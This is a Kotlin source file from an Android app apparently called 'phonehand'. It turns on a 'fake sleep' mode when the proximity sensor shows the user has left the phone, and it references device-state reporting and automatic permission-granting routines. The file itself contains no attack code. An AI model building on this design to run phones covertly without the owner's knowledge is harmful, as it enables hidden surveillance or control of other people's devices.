package com.phonehand.app

import android.content.Context
import android.os.Handler
import android.os.Looper
import android.util.Log

/**
 * Auto fake sleep when the user leaves the phone, optional wake when they return.
 */
object ProximityGuard {
    private const val TAG = "UserProximity"
    private const val PREFS = UserSession.PREFS_NAME
    private const val KEY_AUTO = "auto_proximity_sleep"
    private const val KEY_WAKE_ON_RETURN = "proximity_wake_on_return"

    private var monitor: UserProximityMonitor? = null
    private var proximityActivated = false
    private var userDisabledWhileAway = false

    fun isAutoEnabled(context: Context): Boolean =
        context.getSharedPreferences(PREFS, Context.MODE_PRIVATE).getBoolean(KEY_AUTO, false)

    fun setAutoEnabled(context: Context, enabled: Boolean) {
        context.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .edit()
            .putBoolean(KEY_AUTO, enabled)
            .apply()
        if (enabled) start(context) else stop(context)
        DeviceStateReporter.send(context)
        Log.d(TAG, "auto proximity sleep ${if (enabled) "ON" else "OFF"}")
    }

    fun isWakeOnReturnEnabled(context: Context): Boolean =
        context.getSharedPreferences(PREFS, Context.MODE_PRIVATE).getBoolean(KEY_WAKE_ON_RETURN, true)

    fun setWakeOnReturnEnabled(context: Context, enabled: Boolean) {
        context.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .edit()
            .putBoolean(KEY_WAKE_ON_RETURN, enabled)
            .apply()
    }

    fun toggleAuto(context: Context): Boolean {
        val next = !isAutoEnabled(context)
        setAutoEnabled(context, next)
        return next
    }

    fun onServiceReady(context: Context) {
        Handler(Looper.getMainLooper()).post {
            if (isAutoEnabled(context)) start(context)
        }
    }

    fun stop(context: Context) {
        monitor?.stop()
        monitor = null
    }

    private fun start(context: Context) {
        val app = context.applicationContext
        if (!UserProximityMonitor.isAvailable(app)) {
            Log.w(TAG, "proximity sensor unavailable")
            return
        }
        if (monitor != null) return
        monitor = UserProximityMonitor(app) { userNear ->
            onProximityStable(app, userNear)
        }.also { it.start() }
    }

    private fun onProximityStable(context: Context, userNear: Boolean) {
        if (!isAutoEnabled(context)) return
        if (PermissionAutoGrant.isRunning() || SettingsPermissionGrant.isRunning()) return

        if (userNear) {
            userDisabledWhileAway = false
            if (proximityActivated && isWakeOnReturnEnabled(context) && FakeSleepMode.isEnabled(context)) {
                FakeSleepMode.disable(context, fromProximity = true)
                proximityActivated = false
            }
            return
        }

        if (FakeSleepMode.isEnabled(context) || userDisabledWhileAway) return
        FakeSleepMode.enable(context, fromProximity = true)
        proximityActivated = true
    }

    fun onManualFakeSleepChange(context: Context, enabled: Boolean) {
        if (enabled) {
            proximityActivated = false
            userDisabledWhileAway = false
            return
        }
        proximityActivated = false
        if (!UserProximityMonitor.isUserNear()) {
            userDisabledWhileAway = true
        }
    }

    fun onProximityFakeSleepChange(enabled: Boolean) {
        if (!enabled) proximityActivated = false
    }
}
